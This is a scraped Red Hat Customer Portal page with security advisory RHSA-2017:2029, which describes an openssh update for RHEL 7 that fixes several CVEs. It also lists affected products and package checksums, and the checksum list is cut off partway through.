  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Franais](https://access.redhat.com/changeLanguage?language=fr)
* [](https://access.redhat.com/changeLanguage?language=ko)
* [](https://access.redhat.com/changeLanguage?language=ja)
* [ ()](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

**We're sorry but cve-details doesn't work properly without JavaScript enabled. Please enable it to continue.**

[![Red Hat](https://static.redhat.com/libs/redhat/brand-assets/2/corp/logo--on-dark.svg)](https://redhat.com/en)
[X (formerly Twitter)](https://twitter.com/RedHat)
### Quick Links

* [Downloads](https://access.redhat.com/downloads/)
* [Subscriptions](https://access.redhat.com/management)
* [Support Cases](https://access.redhat.com/support)
* [Customer Service](https://access.redhat.com/support/customer-service)
* [Product Documentation](//docs.redhat.com/)

### Help

* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

  2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from access.redhat.com_3c75ce22_20250125_102959.html ===

Note: Our personalized web services require that your browser be enabled for JavaScript and cookies

[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Franais](https://access.redhat.com/changeLanguage?language=fr)
* [](https://access.redhat.com/changeLanguage?language=ko)
* [](https://access.redhat.com/changeLanguage?language=ja)
* [ ()](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
* [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
### Cloud Computing

* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
* [Red Hat OpenStack Platform](https://access.redhat.com/products/red-hat-openstack-platform/)
* [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform/)
* [Red Hat OpenShift AI](https://access.redhat.com/products/red-hat-openshift-ai/)
* [Red Hat OpenShift Dedicated](https://access.redhat.com/products/openshift-dedicated-red-hat/)
* [Red Hat Advanced Cluster Security for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-security-for-kubernetes/)
* [Red Hat Advanced Cluster Management for Kubernetes](https://access.redhat.com/products/red-hat-advanced-cluster-management-for-kubernetes/)
* [Red Hat Quay](https://access.redhat.com/products/red-hat-quay/)
* [Red Hat OpenShift Dev Spaces](https://access.redhat.com/products/red-hat-openshift-dev-spaces)
* [Red Hat OpenShift Service on AWS](https://access.redhat.com/products/red-hat-openshift-service-aws)
### Storage

* [Red Hat Gluster Storage](https://access.redhat.com/products/red-hat-storage/)
* [Red Hat Hyperconverged Infrastructure](https://access.redhat.com/products/red-hat-hyperconverged-infrastructure/)
* [Red Hat Ceph Storage](https://access.redhat.com/products/red-hat-ceph-storage/)
* [Red Hat OpenShift Data Foundation](https://access.redhat.com/products/red-hat-openshift-data-foundation)
### Runtimes

* [Red Hat Runtimes](https://access.redhat.com/products/red-hat-runtimes/)
* [Red Hat JBoss Enterprise Application Platform](https://access.redhat.com/products/red-hat-jboss-enterprise-application-platform/)
* [Red Hat Data Grid](https://access.redhat.com/products/red-hat-data-grid/)
* [Red Hat JBoss Web Server](https://access.redhat.com/products/red-hat-jboss-web-server/)
* [Red Hat build of Keycloak](https://access.redhat.com/products/red-hat-build-of-keycloak/)
* [Red Hat support for Spring Boot](https://access.redhat.com/products/spring-boot/)
* [Red Hat build of Node.js](https://access.redhat.com/products/nodejs/)
* [Red Hat build of Quarkus](https://access.redhat.com/products/quarkus/)
### Integration and Automation

* [Red Hat Application Foundations](https://access.redhat.com/products/red-hat-application-foundations/)
* [Red Hat Fuse](https://access.redhat.com/products/red-hat-fuse/)
* [Red Hat AMQ](https://access.redhat.com/products/red-hat-amq/)
* [Red Hat 3scale API Management](https://access.redhat.com/products/red-hat-3scale/)

[All Products](https://access.redhat.com/products/)

[Red Hat Product Errata](/errata)
RHSA-2017:2029 - Security Advisory

Issued:
2017-08-01
Updated:
2017-08-01
# RHSA-2017:2029 - Security Advisory

* [Overview](#overview)
* [Updated Packages](#packages)

## Synopsis

Moderate: openssh security, bug fix, and enhancement update

## Type/Severity

Security Advisory: Moderate

## Red Hat Insights patch analysis

Identify and remediate systems affected by this advisory.

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2017%3A2029)

## Topic

An update for openssh is now available for Red Hat Enterprise Linux 7.

Red Hat Product Security has rated this update as having a security impact of Moderate. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

OpenSSH is an SSH protocol implementation supported by a number of Linux, UNIX, and similar operating systems. It includes the core files necessary for both the OpenSSH client and server.

The following packages have been upgraded to a later upstream version: openssh (7.4p1). (BZ#1341754)

Security Fix(es):

* A covert timing channel flaw was found in the way OpenSSH handled authentication of non-existent users. A remote unauthenticated attacker could possibly use this flaw to determine valid user names by measuring the timing of server responses. (CVE-2016-6210)
* It was found that OpenSSH did not limit password lengths for password authentication. A remote unauthenticated attacker could use this flaw to temporarily trigger high CPU consumption in sshd by sending long passwords. (CVE-2016-6515)
* It was found that ssh-agent could load PKCS#11 modules from arbitrary paths. An attacker having control of the forwarded agent-socket on the server, and the ability to write to the filesystem of the client host, could use this flaw to execute arbitrary code with the privileges of the user running ssh-agent. (CVE-2016-10009)
* It was found that the host private key material could possibly leak to the privilege-separated child processes via re-allocated memory. An attacker able to compromise the privilege-separated process could therefore obtain the leaked key information. (CVE-2016-10011)
* It was found that the boundary checks in the code implementing support for pre-authentication compression could have been optimized out by certain compilers. An attacker able to compromise the privilege-separated process could possibly use this flaw for further attacks against the privileged monitor process. (CVE-2016-10012)

Additional Changes:

For detailed information on changes in this release, see the Red Hat Enterprise Linux 7.4 Release Notes linked from the References section.

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

After installing this update, the OpenSSH server daemon (sshd) will be restarted automatically.

## Affected Products

* Red Hat Enterprise Linux Server 7 x86\_64
* Red Hat Enterprise Linux for x86\_64 - Extended Update Support 7.7 x86\_64
* Red Hat Enterprise Linux for x86\_64 - Extended Update Support 7.6 x86\_64
* Red Hat Enterprise Linux for x86\_64 - Extended Update Support 7.5 x86\_64
* Red Hat Enterprise Linux for x86\_64 - Extended Update Support 7.4 x86\_64
* Red Hat Enterprise Linux Server - AUS 7.7 x86\_64
* Red Hat Enterprise Linux Server - AUS 7.6 x86\_64
* Red Hat Enterprise Linux Server - AUS 7.4 x86\_64
* Red Hat Enterprise Linux Server - Extended Life Cycle Support 7 x86\_64
* Red Hat Enterprise Linux Workstation 7 x86\_64
* Red Hat Enterprise Linux Desktop 7 x86\_64
* Red Hat Enterprise Linux for IBM z Systems 7 s390x
* Red Hat Enterprise Linux for IBM z Systems - Extended Update Support 7.7 s390x
* Red Hat Enterprise Linux for IBM z Systems - Extended Update Support 7.6 s390x
* Red Hat Enterprise Linux for IBM z Systems - Extended Update Support 7.5 s390x
* Red Hat Enterprise Linux for IBM z Systems - Extended Update Support 7.4 s390x
* Red Hat Enterprise Linux for Power, big endian 7 ppc64
* Red Hat Enterprise Linux for Power, big endian - Extended Update Support 7.7 ppc64
* Red Hat Enterprise Linux for Power, big endian - Extended Update Support 7.6 ppc64
* Red Hat Enterprise Linux for Power, big endian - Extended Update Support 7.5 ppc64
* Red Hat Enterprise Linux for Power, big endian - Extended Update Support 7.4 ppc64
* Red Hat Enterprise Linux for Scientific Computing 7 x86\_64
* Red Hat Enterprise Linux for Power, little endian 7 ppc64le
* Red Hat Enterprise Linux for Power, little endian - Extended Update Support 7.7 ppc64le
* Red Hat Enterprise Linux for Power, little endian - Extended Update Support 7.6 ppc64le
* Red Hat Enterprise Linux for Power, little endian - Extended Update Support 7.5 ppc64le
* Red Hat Enterprise Linux for Power, little endian - Extended Update Support 7.4 ppc64le
* Red Hat Enterprise Linux Server - TUS 7.7 x86\_64
* Red Hat Enterprise Linux Server - TUS 7.6 x86\_64
* Red Hat Enterprise Linux Server - Extended Life Cycle Support (for IBM z Systems) 7 s390x
* Red Hat Enterprise Linux EUS Compute Node 7.7 x86\_64
* Red Hat Enterprise Linux EUS Compute Node 7.6 x86\_64
* Red Hat Enterprise Linux EUS Compute Node 7.5 x86\_64
* Red Hat Enterprise Linux EUS Compute Node 7.4 x86\_64
* Red Hat Enterprise Linux Server for Power LE - Update Services for SAP Solutions 7.7 ppc64le
* Red Hat Enterprise Linux Server for Power LE - Update Services for SAP Solutions 7.6 ppc64le
* Red Hat Enterprise Linux Server for Power LE - Update Services for SAP Solutions 7.4 ppc64le
* Red Hat Enterprise Linux for x86\_64 - Update Services for SAP Solutions 7.7 x86\_64
* Red Hat Enterprise Linux for x86\_64 - Update Services for SAP Solutions 7.6 x86\_64
* Red Hat Enterprise Linux for x86\_64 - Update Services for SAP Solutions 7.4 x86\_64
* Red Hat Enterprise Linux Server - Extended Life Cycle Support for IBM Power, big endian 7 ppc64
* Red Hat Enterprise Linux Server - Extended Life Cycle Support for IBM Power, little endian 7 ppc64le

## Fixes

* [BZ - 1357442](https://bugzilla.redhat.com/show_bug.cgi?id=1357442)
  - CVE-2016-6210 openssh: User enumeration via covert timing channel
* [BZ - 1360973](https://bugzilla.redhat.com/show_bug.cgi?id=1360973)
  - Support of HostKeyAlgorithms for sshd
* [BZ - 1364935](https://bugzilla.redhat.com/show_bug.cgi?id=1364935)
  - CVE-2016-6515 openssh: Denial of service via very long passwords
* [BZ - 1366400](https://bugzilla.redhat.com/show_bug.cgi?id=1366400)
  - openssh-server doesn't support unix socket forwarding
* [BZ - 1373835](https://bugzilla.redhat.com/show_bug.cgi?id=1373835)
  - Ciphers and MACs enabled by default differ from upstream OpenSSH 6.7 with security implications.
* [BZ - 1375179](https://bugzilla.redhat.com/show_bug.cgi?id=1375179)
  - [RFE] RC4 and CBC ciphers shipped with openssh and openssh-server should be removed
* [BZ - 1381997](https://bugzilla.redhat.com/show_bug.cgi?id=1381997)
  - Systemctl reload sshd caused inactive service even if the service is running
* [BZ - 1396400](https://bugzilla.redhat.com/show_bug.cgi?id=1396400)
  - The ssh to RHEL7 ignores echo setting
* [BZ - 1398569](https://bugzilla.redhat.com/show_bug.cgi?id=1398569)
  - sftp/ssh ignores group permissions
* [BZ - 1402424](https://bugzilla.redhat.com/show_bug.cgi?id=1402424)
  - infinite loop, at 100% cpu in ssh if ^Z is pressed at password prompt
* [BZ - 1406269](https://bugzilla.redhat.com/show_bug.cgi?id=1406269)
  - CVE-2016-10009 openssh: loading of untrusted PKCS#11 modules in ssh-agent
* [BZ - 1406286](https://bugzilla.redhat.com/show_bug.cgi?id=1406286)
  - CVE-2016-10011 openssh: Leak of host private key material to privilege-separated child process via realloc()
* [BZ - 1406293](https://bugzilla.redhat.com/show_bug.cgi?id=1406293)
  - CVE-2016-10012 openssh: Bounds check can be evaded in the shared memory manager used by pre-authentication compression support
* [BZ - 1418062](https://bugzilla.redhat.com/show_bug.cgi?id=1418062)
  - openssh package openssh-6.6.1p1-33.el7\_3 does not resolve chroot permission denied status.
* [BZ - 1420910](https://bugzilla.redhat.com/show_bug.cgi?id=1420910)
  - OpenSSH ciphers in practice do not meet the stated Common Criteria/FIPS approvals.
* [BZ - 1438414](https://bugzilla.redhat.com/show_bug.cgi?id=1438414)
  - RHEL7.4 in FIPS mode is unable to ssh into RHEL4.9
* [BZ - 1450361](https://bugzilla.redhat.com/show_bug.cgi?id=1450361)
  - pam\_ssh\_agent\_auth i686 and x86\_64 can't be installed side by side

## CVEs

* [CVE-2016-6210](https://www.redhat.com/security/data/cve/CVE-2016-6210.html)
* [CVE-2016-6515](https://www.redhat.com/security/data/cve/CVE-2016-6515.html)
* [CVE-2016-10009](https://www.redhat.com/security/data/cve/CVE-2016-10009.html)
* [CVE-2016-10011](https://www.redhat.com/security/data/cve/CVE-2016-10011.html)
* [CVE-2016-10012](https://www.redhat.com/security/data/cve/CVE-2016-10012.html)
* [CVE-2016-10708](https://www.redhat.com/security/data/cve/CVE-2016-10708.html)

## References

* <https://access.redhat.com/security/updates/classification/#moderate>
* <https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/7/html/7.4_Release_Notes/index.html>

**Note:**
More recent versions of these packages may be available.
Click a package name for more details.
## Red Hat Enterprise Linux Server 7

| SRPM | |
| --- | --- |
| openssh-7.4p1-11.el7.src.rpm | SHA-256: cc80cc4974ff41e4ed42a77275e25e66d9e13ac4368d595969b0f4c4bf5a1567 |
| x86\_64 | |
| openssh-7.4p1-11.el7.x86\_64.rpm | SHA-256: 94864530bd5f173b1f3cb82739ace172cb960cf1e8e527a1f566248fc6349d49 |
| openssh-askpass-7.4p1-11.el7.x86\_64.rpm | SHA-256: 79fbe87f1a024b0c95b68d85d4c8118916b6528d3b4c69d30c66ee8e94da8e17 |
| openssh-cavs-7.4p1-11.el7.x86\_64.rpm | SHA-256: 8895ad15f62a70095806356cc9f196363bfdcc7da343ecb4902d494c954f0c58 |
| openssh-clients-7.4p1-11.el7.x86\_64.rpm | SHA-256: 839a453e2790c62e1bf4c176faf86c73181e1d03243c973f892a6eab500b46b7 |
| openssh-debuginfo-7.4p1-11.el7.i686.rpm | SHA-256: 5c47d884f895477a953708bf4a623da3ce9f163b5b64dabf7133fc6024357c0e |
| openssh-debuginfo-7.4p1-11.el7.x86\_64.rpm | SHA-256: c04ed6a60dbc1ff7fb18954913bc55fefa6d4ce35f5a012c6694f610b4c6aeb2 |
| openssh-debuginfo-7.4p1-11.el7.x86\_64.rpm | SHA-256: c04ed6a60dbc1ff7fb18954913bc55fefa6d4ce35f5a012c6694f610b4c6aeb2 |
| openssh-keycat-7.4p1-11.el7.x86\_64.rpm | SHA-256: ce7bf2f101f522a861abf3925c4af662635f8a57dda6faca5c1dcd6994e419c0 |
| openssh-ldap-7.4p1-11.el7.x86\_64.rpm | SHA-256: f6ec40a50a19f120d31d42c640231bb072f413bafc6f48a1bea8497482513578 |
| openssh-server-7.4p1-11.el7.x86\_64.rpm | SHA-256: 4a2ef6d2104f11cb59bb474c930af7060fc20b17daae59d5df861545f241a575 |
| openssh-server-sysvinit-7.4p1-11.el7.x86\_64.rpm | SHA-256: b6cde300dea346f8f51916dff85f10eda2170f2199d8e1a39d2370abf3d4a14c |
| pam\_ssh\_agent\_auth-0.10.3-1.11.el7.i686.rpm | SHA-256: b417f25416a02e4bbc7cdfb23e35482569fb52f1b94f6219be0b1163a049b25c |
| pam\_ssh\_agent\_auth-0.10.3-1.11.el7.x86\_64.rpm | SHA-256: a244fdcd7a81ec13329e87e7bada7552c6ea92afca7d9ac38f9600feee227043 |

## Red Hat Enterprise Linux for x86\_64 - Extended Update Support 7.7

| SRPM | |
| --- | --- |
| openssh-7.4p1-11.el7.src.rpm | SHA-256: cc80cc4974ff41e4ed42a77275e25e66d9e13ac4368d595969b0f4c4bf5a1567 |
| x86\_64 | |
| openssh-7.4p1-11.el7.x86\_64.rpm | SHA-256: 94864530bd5f173b1f3cb82739ace172cb960cf1e8e527a1f566248fc6349d49 |
| openssh-askpass-7.4p1-11.el7.x86\_64.rpm | SHA-256: 79fbe87f1a024b0c95b68d85d4c8118916b6528d3b4c69d30c66ee8e94da8e17 |
| openssh-cavs-7.4p1-11.el7.x86\_64.rpm | SHA-256: 8895ad15f62a70095806356cc9f196363bfdcc7da343ecb4902d494c954f0c58 |
| openssh-clients-7.4p1-11.el7.x86\_64.rpm | SHA-256: 839a453e2790c62e1bf4c176faf86c73181e1d03243c973f892a6eab500b46b7 |
| openssh-debuginfo-7.4p1-11.el7.i686.rpm | SHA-256: 5c47d884f895477a953708bf4a623da3ce9f163b5b64dabf7133fc6024357c0e |
| openssh-debuginfo-7.4p1-11.el7.x86\_64.rpm | SHA-256: c04ed6a60dbc1ff7fb18954913bc55fefa6d4ce35f5a012c6694f610b4c6aeb2 |
| openssh-debuginfo-7.4p1-11.el7.x86\_64.rpm | SHA-256: c04ed6a60dbc1ff7fb18954913bc55fefa6d4ce35f5a012c6694f610b4c6aeb2 |
| openssh-keycat-7.4p1-11.el7.x86\_64.rpm | SHA-256: ce7bf2f101f522a861abf3925c4af662635f8a57dda6faca5c1dcd6994e419c0 |
| openssh-ldap-7.4p1-11.el7.x86\_64.rpm | SHA-256: f6ec40a50a19f120d31d42c640231bb072f413bafc6f48a1bea8497482513578 |
| openssh-server-7.4p1-11.el7.x86\_64.rpm | SHA-256: 4a2ef6d2104f11cb59bb474c930af7060fc20b17daae59d5df861545f241a575 |
| openssh-server-sysvinit-7.4p1-11.el7.x86\_64.rpm | SHA-256: b6cde300dea346f8f51916dff85f10eda2170f2199d8e1a39d2370abf3d4a14c |
| pam\_ssh\_agent\_auth-0.10.3-1.11.el7.i686.rpm | SHA-256: b417f25416a02e4bbc7cdfb23e35482569fb52f1b94f6219be0b1163a049b25c |
| pam\_ssh\_agent\_auth-0.10.3-1.11.el7.x86\_64.rpm | SHA-256: a244fdcd7a81ec13329e87e7bada7552c6ea92afca7d9ac38f9600feee227043 |

## Red Hat Enterprise Linux for x86\_64 - Extended Update Support 7.6

| SRPM | |
| --- | --- |
| openssh-7.4p1-11.el7.src.rpm | SHA-256: cc80cc4974ff41e4ed42a77275e25e66d9e13ac4368d595969b0f4c4bf5a1567 |
| x86\_64 | |
| openssh-7.4p1-11.el7.x86\_64.rpm | SHA-256: 94864530bd5f173b1f3cb82739ace172cb960cf1e8e527a1f566248fc6349d49 |
| openssh-askpass-7.4p1-11.el7.x86\_64.rpm | SHA-256: 79fbe87f1a024b0c95b68d85d4c8118916b6528d3b4c69d30c66ee8e94da8e17 |
| openssh-cavs-7.4p1-11.el7.x86\_64.rpm | SHA-256: 8895ad15f62a70095806356cc9f196363bfdcc7da343ecb4902d494c954f0c58 |
| openssh-clients-7.4p1-11.el7.x86\_64.rpm | SHA-256: 839a453e2790c62e1bf4c176faf86c73181e1d03243c973f892a6eab500b46b7 |
| openssh-debuginfo-7.4p1-11.el7.i686.rpm | SHA-256: 5c47d884f895477a953708bf4a623da3ce9f163b5b64dabf7133fc6024357c0e |
| openssh-debuginfo-7.4p1-11.el7.x86\_64.rpm | SHA-256: c04ed6a60dbc1ff7fb18954913bc55fefa6d4ce35f5a012c6694f610b4c6aeb2 |
| openssh-debuginfo-7.4p1-11.el7.x86\_64.rpm | SHA-256: c04ed6a60dbc1ff7fb18954913bc55fefa6d4ce35f5a012c6694f610b4c6aeb2 |
| openssh-keycat-7.4p1-11.el7.x86\_64.rpm | SHA-256: ce7bf2f101f522a861abf3925c4af662635f8a57dda6faca5c1dcd6994e419c0 |
| openssh-ldap-7.4p1-11.el7.x86\_64.rpm | SHA-256: f6ec40a50a19f120d31d42c640231bb072f413bafc6f48a1bea8497482513578 |
| openssh-server-7.4p1-11.el7.x86\_64.rpm | SHA-256: 4a2ef6d2104f11cb59bb474c930af7060fc20b17daae59d5df861545f241a575 |
| openssh-server-sysvinit-7.4p1-11.el7.x86\_64.rpm | SHA-256: b6cde300dea346f8f51916dff85f10eda2170f2199d8e1a39d2370abf3d4a14c |
| pam\_ssh\_agent\_auth-0.10.3-1.11.el7.i686.rpm | SHA-256: b417f25416a02e4bbc7cdfb23e35482569fb52f1b94f6219be0b1163a049b25c |
| pam\_ssh\_agent\_auth-0.10.3-1.11.el7.x86\_64.rpm | SHA-256: a244fdcd7a81ec13329e87e7bada7552c6ea92afca7d9ac38f9600feee227043 |

## Red Hat Enterprise Linux for x86\_64 - Extended Update Support 7.5

| SRPM | |
| --- | --- |
| openssh-7.4p1-11.el7.src.rpm | SHA-256: cc80cc4974ff41e4ed42a77275e25e66d9e13ac4368d595969b0f4c4bf5a1567 |
| x86\_64 | |
| openssh-7.4p1-11.el7.x86\_64.rpm | SHA-256: 94864530bd5f173b1f3cb82739ace172cb960cf1e8e527a1f566248fc6349d49 |
| openssh-askpass-7.4p1-11.el7.x86\_64.rpm | SHA-256: 79fbe87f1a024b0c95b68d85d4c8118916b6528d3b4c69d30c66ee8e94da8e17 |
